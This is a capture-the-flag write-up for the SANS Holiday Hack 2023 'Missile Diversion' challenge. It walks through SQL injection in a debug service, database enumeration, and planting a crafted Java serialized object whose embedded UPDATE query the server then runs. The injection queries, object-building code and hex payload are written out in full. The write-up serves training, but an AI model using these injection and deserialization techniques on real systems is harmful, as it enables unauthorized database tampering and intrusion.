# Writeup for The 2023 SANS Holiday Hack Challenge: A Holiday Odyssey \| Featuring 6: Geese A-Lei'ing!
## Missile Diversion
Difficulty: :christmas_tree::christmas_tree::christmas_tree::christmas_tree::christmas_tree:  
Thwart Jack's evil plan by re-aiming his missile at the Sun.

### Solution
Re-utilizing the same environment from before, I used the `Consumer Test Tool` to connect to `maltcp://10.1.1.1:1024/nanosat-mo-supervisor-Directory`, start the `missile-targeting-system`, and then connecting to `maltcp://10.1.1.1:1026/missile-targeting-system-Directory`. This exposes the `Debug` Action Service along with 4 Parameter Services: `PointingMode`, returning the current pointing mode, `X` and `Y`, returning the coordinates, and `Debug`, returning the last output from the `Debug` Action Service. Trying to set `X`, `Y` and `PointingMode` was not giving any result. I then tried submitting the `Debug` Action without any input and the `Debug` Parameter Service returned the string `VERSION(): 11.2.2-MariaDB-1:11.2.2+maria~ubu2204`, clearly identifying the interaction with a DB. I tested the action service for common SQL injection by using the attribute value to inject the payload, eventually finding `;[PAYLOAD]` as a resilient injection pattern. I then enumerated the tables in the database and their content:

> **Query**: `; SELECT * FROM pointing_mode_to_str`  
> **Results**:  
> id: 1 \| numerical_mode: 0 \| str_mode: Earth Point Mode \| str_desc: When pointing_mode is 0, targeting system applies the target_coordinates to earth.  
> id: 2 \| numerical_mode: 1 \| str_mode: Sun Point Mode \| str_desc: When pointing_mode is 1, targeting system points at the sun, ignoring the coordinates. \|

> **Query**: `; SELECT * FROM user_variables`
> **Results**:  
> java.sql.SQLSyntaxErrorException: (conn-3488) SELECT command denied to user 'targeter @'172.18.0.4' for table missile_targeting system. 'user_variables

> **Query**: `; SELECT * FROM messaging`
> **Results**:  
> id: 1 \| msg_type: RedAlphaMsg \| msg_data: RONCTTLA \|  
> id: 2 \| msg_type: MsgAuth \| msg_data: 220040DL \| 11.2.2-MariaDB-1:11.2.2+maria-ubu2204 \|  
> id: 3 \| msg_type: LaunchCode \| msg_data: DLG2209TVX \|  
> id: 4 \| msg_type: LaunchOrder \| msg_data: CONFIRMED \|  
> id: 5 \| msg_type: TargetSelection \| msg_data: CONFIRMED \|  
> id: 6 \| msg_type: TimeOnTargetSequence \| msg_data: COMPLETE \|  
> id: 7 \| msg_type: YieldSelection \| msg_data: COMPLETE \|  
> id: 8 \| msg_type: MissileDownlink \| msg_data: ONLINE \|  
> id: 9 \| msg_type: TargetDownlinked \| msg_data: FALSE \|  

> **Query**: `; SELECT * FROM pointing_mode`
> **Results**:  
> id: 1 \| numerical_mode: 0 \|  

> **Query**: `; SELECT * FROM target_coordinates`
> **Results**:  
> id: 1 lat: 1.14514 \| Ing: -145.262 \|  

> **Query**: `; SELECT * FROM satellite_query`
> **Results**:  
> jid: 1 | object: `........sr..SatelliteQueryFileFolderUtility.......................Z..isQueryZ..isUpdateL..pathOrStatementt..Ljava/lang/String;xp..t.)/opt/SatelliteQueryFileFolderUtility.java` | results: `import java.io.Serializable; /* Output removed to shorten report */ public class SatelliteQueryFileFolderUtility implements Serializable { /* Output removed to shorten report */`

I then shown the grants for the user with the query `;SHOW GRANTS`:
```
Grants for targeter@%: GRANT USAGE ON *.* TO 'targeter`@`%` IDENTIFIED BY PASSWORD **41E2CFE844C8F1F375D5704992440920F11A118A |
Grants for targeter@%: GRANT SELECT, INSERT ON `missile_targeting system`.`satellite_query' TO 'targeter`@`%` |
Grants for targeter@%: GRANT SELECT ON `missile targeting system`.`pointing_mode' TO 'targeter"@"%" |
Grants for targeter@%: GRANT SELECT ON `missile targeting system`.`messaging' TO 'targeter"@"%" |
Grants for targeter@%: GRANT SELECT ON `missile targeting system". "target_coordinates' TO 'targeter`@`%` |
Grants for targeter@%: GRANT SELECT ON `missile targeting system`.`pointing_mode_to_str` TO `targeter`@`%` |
```

As I could only insert in `satellite_query`, I took a closer look at the table with the query `;DESCRIBE satellite_query`:
```
COLUMN_NAME: jid | COLUMN_TYPE: int(11) | IS_NULLABLE: NO | COLUMN_KEY: PRI | COLUMN_DEFAULT: null | EXTRA: auto_increment |
COLUMN_NAME: object | COLUMN_TYPE: blob | IS_NULLABLE: YES | COLUMN_KEY: COLUMN_DEFAULT: null | EXTRA: |
COLUMN_NAME: results | COLUMN_TYPE: text | IS_NULLABLE: YES | COLUMN_KEY: COLUMN_DEFAULT: null | EXTRA: |
```

I also downloaded the content of the column object in base64 to analyze it better with the query `;SELECT TO_BASE64(object) FROM satellite_query`:
```
rO0ABXNyAB9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5EtT2jQ6zkssCAANaAAdpc1F1
ZXJ5WgAIaXNVcGRhdGVMAA9wYXRoT3JTdGF0ZW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAA
dAApL29wdC9TYXRlbGxpdGVRdWVyeUZpbGVGb2xkZXJVdGlsaXR5LmphdmE=
```

Once converted to binary again, I could notice it began with `ACED`, the `STREAM_MAGIC` for Java serialized objects:
```
00000000  ac ed 00 05 73 72 00 1f  53 61 74 65 6c 6c 69 74  |....sr..Satellit|
00000010  65 51 75 65 72 79 46 69  6c 65 46 6f 6c 64 65 72  |eQueryFileFolder|
00000020  55 74 69 6c 69 74 79 12  d4 f6 8d 0e b3 92 cb 02  |Utility.........|
00000030  00 03 5a 00 07 69 73 51  75 65 72 79 5a 00 08 69  |..Z..isQueryZ..i|
00000040  73 55 70 64 61 74 65 4c  00 0f 70 61 74 68 4f 72  |sUpdateL..pathOr|
00000050  53 74 61 74 65 6d 65 6e  74 74 00 12 4c 6a 61 76  |Statementt..Ljav|
00000060  61 2f 6c 61 6e 67 2f 53  74 72 69 6e 67 3b 78 70  |a/lang/String;xp|
00000070  00 00 74 00 29 2f 6f 70  74 2f 53 61 74 65 6c 6c  |..t.)/opt/Satell|
00000080  69 74 65 51 75 65 72 79  46 69 6c 65 46 6f 6c 64  |iteQueryFileFold|
00000090  65 72 55 74 69 6c 69 74  79 2e 6a 61 76 61        |erUtility.java|
0000009e
```

Now, focusing on the Java code in the column `results` of `satellite_query`:
```java
import java.io.Serializable;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import java.sql.*;
import com.google.gson.Gson;

public class SatelliteQueryFileFolderUtility implements Serializable {
    private String pathOrStatement;
    private boolean isQuery;
    private boolean isUpdate;

    public SatelliteQueryFileFolderUtility(String pathOrStatement, boolean isQuery, boolean isUpdate) {
        this.pathOrStatement = pathOrStatement;
        this.isQuery = isQuery;
        this.isUpdate = isUpdate;
    }

    public String getResults(Connection connection) {
        if (isQuery && connection != null) {
            if (!isUpdate) {
                try (PreparedStatement selectStmt = connection.prepareStatement(pathOrStatement);
                     ResultSet rs = selectStmt.executeQuery()) {
                    List<HashMap<String, String>> rows = new ArrayList<>();
                    while(rs.next()) {
                        HashMap<String, String> row = new HashMap<>();
                        for (int i = 1; i <= rs.getMetaData().getColumnCount(); i++) {
                            String key = rs.getMetaData().getColumnName(i);
                            String value = rs.getString(i);
                            row.put(key, value);
                        }
                        rows.add(row);
                    }
                    Gson gson = new Gson();
                    String json = gson.toJson(rows);
                    return json;
                } catch (SQLException sqle) {
                    return "SQL Error: " + sqle.toString();
                }
            } else {
                try (PreparedStatement pstmt = connection.prepareStatement(pathOrStatement)) {
                    pstmt.executeUpdate();
                    return "SQL Update completed.";
                } catch (SQLException sqle) {
                    return "SQL Error: " + sqle.toString();
                }
            }
        } else {
            Path path = Paths.get(pathOrStatement);
            try {
                if (Files.notExists(path)) {
                    return "Path does not exist.";
                } else if (Files.isDirectory(path)) {
                    try (Stream<Path> walk = Files.walk(path, 1)) {
                        return walk.skip(1)
                                .map(p -> Files.isDirectory(p) ? "D: " + p.getFileName() : "F: " + p.getFileName())
                                .collect(Collectors.joining("\n"));
                    }
                } else {
                    return new String(Files.readAllBytes(path), StandardCharsets.UTF_8);
                }
            } catch (IOException e) {
                return "Error reading path: " + e.toString();
            }
        }
    }

    public String getpathOrStatement() {
        return pathOrStatement;
    }
}
```

It looked like a serializable object that could execute commands and database queries, including updates. Then [ChatGPT](https://chat.openai.com) wrote the code to provide me with a hex encoded serialized instance for the `SatelliteQueryFileFolderUtility` object. I added the query to update `pointing_mode.numerical_mode` setting it to `1` resulting in:
```java
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class SerializationExample {
    public static void main(String[] args) {
    	SatelliteQueryFileFolderUtility obj = new SatelliteQueryFileFolderUtility(
                                  "UPDATE pointing_mode SET numerical_mode = 1 WHERE id=1", true, true);
        String hexString = serializeToHexString(obj);
        System.out.println("Serialized Hex String: " + hexString);
    }

    private static String serializeToHexString(Object obj) {
        try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
             ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream)) {
            objectOutputStream.writeObject(obj);

            byte[] byteArray = byteArrayOutputStream.toByteArray();
            StringBuilder hexString = new StringBuilder();
            for (byte b : byteArray) {
                hexString.append(String.format("%02X", b));
            }

            return hexString.toString();
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }
}
```

Which returned:
```
Serialized Hex String: ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B7870010174003655504441544520706F696E74696E675F6D6F646520534554206E756D65726963616C5F6D6F6465203D20312057484552452069643D31
```

I inserted this hex string in the table with the following query:
```sql
;INSERT INTO satellite_query(object) VALUES (X'ACED00057372001F536174656C6C697465517565727946696C65466F6C6465725574696C69747912D4F68D0EB392CB0200035A0007697351756572795A000869735570646174654C000F706174684F7253746174656D656E747400124C6A6176612F6C616E672F537472696E673B7870010174003655504441544520706F696E74696E675F6D6F646520534554206E756D65726963616C5F6D6F6465203D20312057484552452069643D31')
```

That did the trick and I could confirm it with the following query:
```sql
; SELECT results, numerical_mode FROM satellite_query, pointing_mode ORDER BY jid DESC LIMIT 1
```

That returned:
```
results: SQL Update completed. | numerical_mode: 1 |
```
